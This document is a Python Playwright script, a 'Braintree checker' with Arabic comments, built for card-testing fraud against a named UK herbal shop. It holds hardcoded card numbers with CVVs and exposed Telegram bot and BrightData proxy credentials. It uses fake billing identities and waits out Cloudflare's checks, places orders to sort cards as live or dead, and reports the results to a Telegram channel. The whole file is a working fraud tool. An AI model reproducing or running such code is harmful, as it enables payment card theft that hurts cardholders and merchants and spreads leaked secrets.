#!/usr/bin/env python3
"""
Herbs Hands Healing - Braintree Checker v4
With Telegram Notifications + Screenshots
"""

from playwright.sync_api import sync_playwright
import time
import random
import json
import re
import requests
import io
from datetime import datetime

# ═══ Telegram Bot ═══
TG_TOKEN = "8647240736:AAEGXuwmtZkUvAfbURX2BcyyuoWD-TekP_0"
TG_CHAT_ID = "6843321125"
TG_API = f"https://api.telegram.org/bot{TG_TOKEN}"

# ═══ BrightData ═══
BD_USER = "brd-customer-hl_24c8058e-zone-scraping_browser1"
BD_PASS = "eyr0v46j28pi"
BD_HOST = "brd.superproxy.io"
BD_PORT = "9222"

# ═══ Site ═══
SITE_URL = "https://shop.herbs-hands-healing.co.uk"

# ═══ Products ═══
PRODUCT_URLS = [
    f"{SITE_URL}/product/breathe-clear-herb-tea-2",
    f"{SITE_URL}/product/evening-peace-herb-tea",
    f"{SITE_URL}/product/pollitox-capsules",
]

# ═══ Cards ═══
CARDS = [
    "5104040287872188|12|2027|951",
    "5156786158125943|07|2028|829",
]

FIRST_NAMES = ["James", "John", "Robert", "Michael"]
LAST_NAMES = ["Smith", "Johnson", "Williams"]

ADDRESSES = [
    {"address": "123 Oxford Street", "city": "London", "postcode": "W1D 2HG"},
    {"address": "45 High Street", "city": "Manchester", "postcode": "M1 1AA"},
    {"address": "78 Queen Street", "city": "Birmingham", "postcode": "B1 1AA"},
]


# ═══════════════════════════════════════════════════════════
# Telegram Helper Functions
# ═══════════════════════════════════════════════════════════

def tg_send(text, parse_mode="HTML"):
    """ابعت رسالة نصية"""
    try:
        r = requests.post(
            f"{TG_API}/sendMessage",
            json={
                "chat_id": TG_CHAT_ID,
                "text": text[:4096],  # Telegram limit
                "parse_mode": parse_mode,
            },
            timeout=10,
            verify=False,
        )
        return r.status_code == 200
    except Exception as e:
        print(f"[TG] Send error: {e}")
        return False


def tg_send_photo(photo_bytes, caption=""):
    """ابعت صورة"""
    try:
        r = requests.post(
            f"{TG_API}/sendPhoto",
            data={
                "chat_id": TG_CHAT_ID,
                "caption": caption[:1024],
                "parse_mode": "HTML",
            },
            files={"photo": ("screenshot.png", photo_bytes, "image/png")},
            timeout=30,
            verify=False,
        )
        return r.status_code == 200
    except Exception as e:
        print(f"[TG] Photo error: {e}")
        return False


def tg_send_error(page, error_msg, context_info=""):
    """ابعت الخطأ + صورة الشاشة"""
    # اطبع في الكونسول
    print(f"❌ [ERROR] {error_msg}")
    print(f"   Context: {context_info}")
    
    # ابعت رسالة نصية
    timestamp = datetime.now().strftime("%H:%M:%S")
    msg = (
        f"🚨 <b>خطأ في البوت</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"⏰ الوقت: <code>{timestamp}</code>\n"
        f"📍 السياق: <code>{context_info}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"❌ الخطأ:\n<code>{error_msg[:500]}</code>"
    )
    tg_send(msg)
    
    # ابعت صورة
    try:
        if page:
            screenshot = page.screenshot(full_page=False)
            tg_send_photo(screenshot, caption=f"📸 {context_info}\n{error_msg[:200]}")
    except Exception as e:
        print(f"[TG] Screenshot error: {e}")


def tg_log_step(step_name, status="✅", details=""):
    """لوج خطوة"""
    timestamp = datetime.now().strftime("%H:%M:%S")
    msg = f"{status} <code>{timestamp}</code> | {step_name}"
    if details:
        msg += f"\n   <i>{details[:200]}</i>"
    tg_send(msg)
    print(f"{status} {step_name} {('- ' + details[:100]) if details else ''}")


# ═══════════════════════════════════════════════════════════
# BrightData Connection
# ═══════════════════════════════════════════════════════════

def connect_browser(p):
    cdp_url = f"wss://{BD_USER}:{BD_PASS}@{BD_HOST}:{BD_PORT}"
    print("🌐 Connecting to BrightData...")
    tg_log_step("🌐 الاتصال بـ BrightData", "⏳", "")
    
    try:
        browser = p.chromium.connect_over_cdp(cdp_url, timeout=120000)
        print("✅ Connected\n")
        tg_log_step("🌐 الاتصال بـ BrightData", "✅", "تم الاتصال")
        return browser
    except Exception as e:
        tg_log_step("🌐 الاتصال بـ BrightData", "❌", str(e)[:200])
        raise


# ═══════════════════════════════════════════════════════════
# Add to Cart
# ═══════════════════════════════════════════════════════════

def add_to_cart_via_ajax(page):
    """أضف منتج للسلة عبر AJAX"""
    print("🛒 Adding product to cart (AJAX)...")
    
    product_id = "10510"  # Breathe & Clear Herb Tea
    
    try:
        result = page.evaluate(f"""
            async () => {{
                try {{
                    const response = await fetch('/?wc-ajax=add_to_cart', {{
                        method: 'POST',
                        headers: {{
                            'Content-Type': 'application/x-www-form-urlencoded',
                        }},
                        body: 'product_id={product_id}&quantity=1'
                    }});
                    const data = await response.json();
                    return data;
                }} catch(e) {{
                    return {{error: e.message}};
                }}
            }}
        """)
        
        print(f"   📦 AJAX response: {str(result)[:100]}")
        
        if result and not result.get('error'):
            if 'cart_hash' in result or 'fragments' in result:
                return True
        return False
        
    except Exception as e:
        print(f"   ❌ AJAX error: {str(e)[:100]}")
        return False


def add_to_cart(page, card_num):
    """أضف منتج للسلة"""
    print("🛒 Adding product to cart...")
    tg_log_step("🛒 إضافة منتج للسلة", "⏳", card_num[:6] + "****")
    
    product_url = random.choice(PRODUCT_URLS)
    product_name = product_url.split('/')[-1]
    print(f"   📦 Product: {product_name}")
    
    try:
        page.goto(product_url, timeout=60000, wait_until="domcontentloaded")
        time.sleep(5)
        
        # انتظر الزر
        try:
            page.wait_for_selector("button[name='add-to-cart'], .single_add_to_cart_button", 
                                   timeout=20000)
        except:
            print("   ⚠️ Button not found, trying AJAX...")
            tg_log_step("🛒 زر الإضافة", "⚠️", "مش موجود - AJAX")
            if add_to_cart_via_ajax(page):
                tg_log_step("🛒 إضافة منتج للسلة", "✅", "AJAX نجح")
                return True
            return False
        
        # اضغط
        add_btn_selectors = [
            "button[name='add-to-cart']",
            ".single_add_to_cart_button",
            "button.single_add_to_cart_button",
        ]
        
        added = False
        for sel in add_btn_selectors:
            try:
                btn = page.query_selector(sel)
                if btn and btn.is_visible():
                    btn.click()
                    added = True
                    break
            except:
                continue
        
        if not added:
            if add_to_cart_via_ajax(page):
                tg_log_step("🛒 إضافة منتج للسلة", "✅", "AJAX")
                return True
            return False
        
        # انتظر
        print("   ⏳ Waiting for cart update (8s)...")
        time.sleep(8)
        
        # تحقق
        cart_verified = False
        
        try:
            count = page.evaluate("""
                () => {
                    const sels = ['.cart-contents-count', '.cart-count', 
                                  '.header-cart-count', '[class*="cart-count"]'];
                    for (const sel of sels) {
                        const el = document.querySelector(sel);
                        if (el) {
                            const t = el.textContent.trim();
                            if (t && t !== '0') return t;
                        }
                    }
                    return '0';
                }
            """)
            if count != '0':
                cart_verified = True
        except:
            pass
        
        if not cart_verified:
            try:
                page.goto(f"{SITE_URL}/cart", timeout=30000, wait_until="domcontentloaded")
                time.sleep(3)
                cart_body = page.inner_text("body").lower()
                if 'empty' not in cart_body and ('subtotal' in cart_body or 'herb' in cart_body):
                    cart_verified = True
            except:
                pass
        
        if not cart_verified:
            if add_to_cart_via_ajax(page):
                cart_verified = True
        
        if cart_verified:
            tg_log_step("🛒 إضافة منتج للسلة", "✅", product_name)
        else:
            tg_log_step("🛒 إضافة منتج للسلة", "⚠️", "لم يتم التحقق")
        
        return cart_verified
        
    except Exception as e:
        print(f"   ❌ Add to cart error: {str(e)[:100]}")
        tg_log_step("🛒 إضافة منتج للسلة", "❌", str(e)[:200])
        return False


# ═══════════════════════════════════════════════════════════
# Fill Braintree Hosted Fields
# ═══════════════════════════════════════════════════════════

def fill_braintree_hosted_fields(page, num, mm, yy, cvv):
    """ملء Braintree Hosted Fields"""
    
    filled = {'card': False, 'expiry': False, 'cvv': False}
    
    print("   ⏳ Waiting for Braintree iframes...")
    time.sleep(5)
    
    all_frames = page.frames
    print(f"   📋 Total frames: {len(all_frames)}")
    
    for frame in all_frames:
        frame_url = frame.url or ""
        frame_name = frame.name or ""
        
        if not ('braintree' in frame_url.lower() or 
                'braintree' in frame_name.lower() or
                'card' in frame_name.lower() or
                'cvv' in frame_name.lower() or
                'expiration' in frame_name.lower()):
            continue
        
        print(f"   🎯 Frame: {frame_name[:40]}")
        
        # Card Number
        if not filled['card']:
            for sel in ["input[autocomplete='cc-number']", "input[name='number']", 
                        "input[name='card-number']"]:
                try:
                    el = frame.query_selector(sel)
                    if el and el.is_visible():
                        el.click()
                        time.sleep(0.5)
                        el.type(num, delay=random.randint(50, 100))
                        filled['card'] = True
                        print(f"   ✅ Card number")
                        break
                except:
                    continue
        
        # Expiry
        if not filled['expiry']:
            for sel in ["input[name='expiration']", "input[name='expirationDate']",
                        "input[autocomplete='cc-exp']"]:
                try:
                    el = frame.query_selector(sel)
                    if el and el.is_visible():
                        el.click()
                        time.sleep(0.5)
                        el.type(f"{mm}{yy[2:]}", delay=random.randint(50, 100))
                        filled['expiry'] = True
                        print(f"   ✅ Expiry")
                        break
                except:
                    continue
        
        # CVV
        if not filled['cvv']:
            for sel in ["input[name='cvv']", "input[name='cvv-field']",
                        "input[autocomplete='cc-csc']"]:
                try:
                    el = frame.query_selector(sel)
                    if el and el.is_visible():
                        el.click()
                        time.sleep(0.5)
                        el.type(cvv, delay=random.randint(50, 100))
                        filled['cvv'] = True
                        print(f"   ✅ CVV")
                        break
                except:
                    continue
        
        if all(filled.values()):
            break
    
    return filled


# ═══════════════════════════════════════════════════════════
# Extract Reason from Page
# ═══════════════════════════════════════════════════════════

def extract_reason(page_text):
    """استخراج سبب الرفض"""
    
    patterns = [
        (r"Reason:\s*Declined\s*-\s*Call\s*Issuer", "DECLINED_CALL_ISSUER"),
        (r"Reason:\s*Do\s*Not\s*Honor", "DO_NOT_HONOR"),
        (r"Reason:\s*Insufficient\s*Funds", "INSUFFICIENT_FUNDS"),
        (r"Reason:\s*Expired\s*Card", "EXPIRED_CARD"),
        (r"Reason:\s*Invalid\s*Credit\s*Card\s*Number", "INVALID_CARD"),
        (r"Reason:\s*CVV", "CVV_INVALID"),
        (r"Reason:\s*Processor\s*Declined", "DECLINED"),
        (r"Reason:\s*Card\s*reported\s*as\s*lost", "LOST_STOLEN"),
        (r"Reason:\s*Restricted\s*Card", "RESTRICTED_CARD"),
        (r"Reason:\s*Suspected\s*Fraud", "SUSPECTED_FRAUD"),
        (r"Reason:\s*Transaction\s*Not\s*Allowed", "NOT_ALLOWED"),
        (r"Reason:\s*([^\n<]+)", "DECLINED"),
    ]
    
    for pattern, code in patterns:
        m = re.search(pattern, page_text, re.IGNORECASE)
        if m:
            return code, m.group(0).strip()
    
    if 'thank you' in page_text.lower() and 'order' in page_text.lower():
        return "CHARGE $1", "Order placed successfully"
    
    return None, None


# ═══════════════════════════════════════════════════════════
# Check Card
# ═══════════════════════════════════════════════════════════

def check_card(browser, card, idx, total):
    """فحص بطاقة واحدة"""
    t0 = time.time()
    
    parts = card.strip().split("|")
    if len(parts) < 4:
        tg_log_step(f"💳 [{idx}/{total}] بطاقة", "❌", "صيغة غلط")
        return "INVALID_FORMAT", "Bad format", 0
    
    num, mm, yy, cvv = parts[0], parts[1].zfill(2), parts[2], parts[3]
    if len(yy) == 2:
        yy = "20" + yy
    
    card_short = f"{num[:6]}****{num[-4:]}"
    
    print(f"{'═'*60}")
    print(f"🔍 [{idx}/{total}] {card_short}")
    print(f"{'═'*60}")
    
    # Telegram notification
    tg_send(
        f"🚀 <b>بدء فحص بطاقة [{idx}/{total}]</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"💳 <code>{card_short}</code>\n"
        f"⏰ {datetime.now().strftime('%H:%M:%S')}"
    )
    
    context = None
    page = None
    try:
        context = browser.new_context(
            viewport={"width": 1366, "height": 900},
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
        )
        page = context.new_page()
        
        # Intercept
        page.add_init_script("""
            window.__all_responses = [];
            const origFetch = window.fetch;
            window.fetch = async function(...args) {
                const response = await origFetch.apply(this, args);
                const url = typeof args[0] === 'string' ? args[0] : (args[0]?.url || '');
                try {
                    const clone = response.clone();
                    const body = await clone.text();
                    window.__all_responses.push({url, status: response.status, body});
                } catch(e) {}
                return response;
            };
        """)
        
        # ═══ Step 1: Add to cart ═══
        print("📄 [1/8] Adding product to cart...")
        if not add_to_cart(page, card_short):
            tg_log_step("❌ فشل في إضافة المنتج", "❌", card_short)
            try:
                context.close()
            except:
                pass
            return "NO_CART", "Could not add to cart", round(time.time() - t0, 1)
        
        # ═══ Step 2: Go to checkout ═══
        print("📄 [2/8] Going to checkout...")
        tg_log_step("📄 فتح صفحة الدفع", "⏳", "")
        page.goto(f"{SITE_URL}/checkout", timeout=90000, wait_until="domcontentloaded")
        time.sleep(3)
        
        # ═══ Step 3: Cloudflare ═══
        print("🛡️  [3/8] Waiting for Cloudflare...")
        for i in range(30):
            title = page.title()
            if "checking" in title.lower() or "just a moment" in title.lower():
                time.sleep(1)
            else:
                print(f"   ✅ Title: {title[:60]}")
                tg_log_step("🛡️ تخطي Cloudflare", "✅", title[:50])
                break
        
        # ═══ Step 4: Wait for form ═══
        print("📝 [4/8] Waiting for form...")
        try:
            page.wait_for_selector("#billing_first_name", timeout=30000)
            print("   ✅ Form visible")
            tg_log_step("📝 نموذج الدفع", "✅", "ظهر")
        except Exception as e:
            tg_send_error(page, "الفورم مش ظاهر", f"Card {card_short}")
            try:
                context.close()
            except:
                pass
            return "NO_FORM", "Form not loaded", round(time.time() - t0, 1)
        
        # ═══ Step 5: Fill billing ═══
        print("📝 [5/8] Filling billing...")
        f = random.choice(FIRST_NAMES)
        l = random.choice(LAST_NAMES)
        em = f"{f.lower()}.{l.lower()}{random.randint(100,999)}@gmail.com"
        ad = random.choice(ADDRESSES)
        
        try:
            page.fill("#billing_first_name", f)
            page.fill("#billing_last_name", l)
            page.fill("#billing_address_1", ad["address"])
            page.fill("#billing_city", ad["city"])
            page.fill("#billing_postcode", ad["postcode"])
            page.fill("#billing_phone", "07123456789")
            page.fill("#billing_email", em)
            tg_log_step("📝 تعبئة البيانات", "✅", f"{f} {l}")
        except Exception as e:
            tg_send_error(page, str(e)[:200], "Billing fill")
        
        time.sleep(1)
        
        # ═══ Step 6: Fill card ═══
        print("💳 [6/8] Filling card...")
        tg_log_step("💳 إدخال البطاقة", "⏳", "")
        
        fill_result = fill_braintree_hosted_fields(page, num, mm, yy, cvv)
        
        if all(fill_result.values()):
            tg_log_step("💳 إدخال البطاقة", "✅", f"{fill_result}")
        else:
            tg_send_error(page, f"Card fill incomplete: {fill_result}", "Card fill")
            tg_log_step("💳 إدخال البطاقة", "⚠️", f"{fill_result}")
        
        time.sleep(1)
        
        # ═══ Step 7: Accept terms + Place order ═══
        print("👆 [7/8] Placing order...")
        
        try:
            terms = page.query_selector("#terms")
            if terms and not terms.is_checked():
                terms.check()
        except:
            try:
                page.click("label[for='terms']")
            except:
                pass
        
        try:
            gdpr = page.query_selector("#gdpr_woo_consent")
            if gdpr and not gdpr.is_checked():
                gdpr.check()
        except:
            pass
        
        time.sleep(1)
        
        try:
            page.click("#place_order")
            tg_log_step("👆 تنفيذ الطلب", "✅", "تم الضغط")
        except:
            tg_log_step("👆 تنفيذ الطلب", "⚠️", "لم يتم الضغط")
        
        # ═══ Step 8: Wait for response ═══
        print("⏳ [8/8] Waiting for response...")
        tg_log_step("⏳ انتظار الرد", "⏳", "40s max")
        
        result_code = "UNKNOWN"
        result_text = ""
        
        for i in range(40):
            time.sleep(1)
            
            # HTML
            try:
                page_text = page.inner_text("body")
                code, text = extract_reason(page_text)
                if code:
                    result_code = code
                    result_text = text
                    break
            except:
                pass
            
            # API
            try:
                responses = page.evaluate("() => window.__all_responses || []")
                for r in reversed(responses):
                    url = r.get('url', '')
                    body = r.get('body', '')
                    
                    if any(x in url for x in ['.js', '.css', '.png']):
                        continue
                    
                    if 'wc-ajax=checkout' in url:
                        try:
                            data = json.loads(body)
                            if data.get('result') == 'success':
                                result_code = "CHARGE $1"
                                result_text = "Success"
                                break
                            elif data.get('result') == 'failure':
                                messages = str(data.get('messages', ''))
                                m = re.search(r'Reason:\s*([^\n<]+)', messages)
                                if m:
                                    reason = m.group(1).strip()
                                    result_text = reason
                                    r_low = reason.lower()
                                    if 'call issuer' in r_low:
                                        result_code = "DECLINED_CALL_ISSUER"
                                    elif 'insufficient' in r_low:
                                        result_code = "INSUFFICIENT_FUNDS"
                                    elif 'do not honor' in r_low:
                                        result_code = "DO_NOT_HONOR"
                                    else:
                                        result_code = "DECLINED"
                                break
                        except:
                            pass
                if result_code != "UNKNOWN":
                    break
            except:
                pass
            
            if (i + 1) % 10 == 0:
                tg_log_step(f"⏳ انتظار ({i+1}s)", "⏳", "")
        
        # ═══ لو لسه UNKNOWN - ابعت صورة ═══
        if result_code == "UNKNOWN":
            try:
                page_text = page.inner_text("body")
                tg_send(
                    f"⚠️ <b>لم يتم التعرف على الرد</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"💳 <code>{card_short}</code>\n"
                    f"📄 نص الصفحة (أول 500 حرف):\n"
                    f"<code>{page_text[:500]}</code>"
                )
                # ابعت صورة
                screenshot = page.screenshot(full_page=False)
                tg_send_photo(screenshot, f"📸 {card_short} - UNKNOWN")
            except:
                pass
        
        try:
            context.close()
        except:
            pass
        
    except Exception as e:
        tg_send_error(page, str(e)[:300], f"Card {card_short}")
        if context:
            try:
                context.close()
            except:
                pass
        result_code = f"ERR: {str(e)[:60]}"
        result_text = str(e)[:100]
    
    elapsed = round(time.time() - t0, 1)
    
    # ═══ Result notification ═══
    is_live = result_code in [
        'INSUFFICIENT_FUNDS', 'DECLINED_CALL_ISSUER', 'DO_NOT_HONOR',
        'DECLINED', 'SUSPECTED_FRAUD', 'RESTRICTED_CARD', 'NOT_ALLOWED',
        'STOPPED_BILLING', 'CHARGE $1', 'TOKENIZED', 'VIOLATION',
    ]
    
    if result_code == "CHARGE $1":
        icon = "🔥🔥"
        status = "CHARGE"
    elif is_live:
        icon = "🔥"
        status = "LIVE"
    elif result_code.startswith("ERR") or result_code in ['NO_FORM', 'NO_CART', 'UNKNOWN']:
        icon = "⚠️"
        status = "ERROR"
    else:
        icon = "❌"
        status = "DEAD"
    
    tg_send(
        f"{icon} <b>{status}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"💳 <code>{card_short}</code>\n"
        f"📝 <code>{result_code}</code>\n"
        f"💬 {result_text[:200] if result_text else '-'}\n"
        f"⏱️ {elapsed}s"
    )
    
    print(f"\n📝 {result_code}")
    if result_text:
        print(f"   💬 {result_text}")
    print(f"⏱️  {elapsed}s\n")
    
    return result_code, result_text, elapsed


# ═══════════════════════════════════════════════════════════
# Main
# ═══════════════════════════════════════════════════════════

def main():
    print("=" * 60)
    print("  🌿 Herbs Hands Healing - v4 (Telegram)")
    print("  🚀 BrightData Scraping Browser")
    print("=" * 60)
    
    # ═══ Startup notification ═══
    tg_send(
        f"🚀 <b>البوت اشتغل</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"💳 عدد البطاقات: <code>{len(CARDS)}</code>\n"
        f"🌐 Zone: <code>{BD_USER[-30:]}</code>\n"
        f"⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    
    print(f"\n  💳 Cards: {len(CARDS)}\n")
    
    with sync_playwright() as p:
        try:
            browser = connect_browser(p)
        except Exception as e:
            tg_send(f"❌ <b>فشل الاتصال بـ BrightData</b>\n<code>{str(e)[:300]}</code>")
            return
        
        results = []
        for idx, card in enumerate(CARDS, 1):
            try:
                code, text, elapsed = check_card(browser, card, idx, len(CARDS))
            except Exception as e:
                code, text, elapsed = f"ERR: {str(e)[:60]}", str(e)[:100], 0
                tg_send(f"❌ <b>خطأ فادح</b>\n<code>{str(e)[:300]}</code>")
            
            results.append({
                'card': card,
                'code': code,
                'text': text,
                'elapsed': elapsed,
            })
            
            if idx < len(CARDS):
                delay = random.uniform(10, 15)
                print(f"⏸️  Waiting {delay:.1f}s...\n")
                tg_log_step(f"⏸️ انتظار {delay:.1f}s", "⏳", "")
                time.sleep(delay)
        
        try:
            browser.close()
        except:
            pass
    
    # ═══ Summary ═══
    print("=" * 60)
    print("📊 النتائج النهائية")
    print("=" * 60)
    
    live_codes = [
        'INSUFFICIENT_FUNDS', 'DECLINED_CALL_ISSUER', 'DO_NOT_HONOR',
        'DECLINED', 'SUSPECTED_FRAUD', 'RESTRICTED_CARD', 'NOT_ALLOWED',
        'STOPPED_BILLING', 'CHARGE $1', 'TOKENIZED', 'VIOLATION',
    ]
    
    live_count = 0
    dead_count = 0
    error_count = 0
    charge_count = 0
    
    summary_lines = ["📊 <b>ملخص النتائج</b>", "━━━━━━━━━━━━━━━━━━━━"]
    
    for r in results:
        code = r['code']
        
        if code == 'CHARGE $1':
            status = "🔥 CHARGE"
            charge_count += 1
            live_count += 1
        elif code in live_codes:
            status = "🔥 LIVE"
            live_count += 1
        elif code.startswith('ERR') or code in ['NO_FORM', 'NO_CART', 'UNKNOWN', 'INVALID_FORMAT']:
            status = "⚠️ ERROR"
            error_count += 1
        else:
            status = "❌ DEAD"
            dead_count += 1
        
        print(f"\n💳 {r['card']}")
        print(f"   📝 {r['code']}")
        print(f"   {status} | ⏱️ {r['elapsed']}s")
        
        summary_lines.append(
            f"{status} | <code>{r['card'][:6]}****{r['card'][-4:15]}</code>\n"
            f"   <code>{code}</code> - {r['elapsed']}s"
        )
    
    summary_lines.append("━━━━━━━━━━━━━━━━━━━━")
    summary_lines.append(f"🔥 CHARGE: {charge_count}")
    summary_lines.append(f"✅ LIVE:   {live_count}")
    summary_lines.append(f"❌ DEAD:   {dead_count}")
    summary_lines.append(f"⚠️ ERRORS: {error_count}")
    
    tg_send("\n".join(summary_lines))


if __name__ == "__main__":
    main()
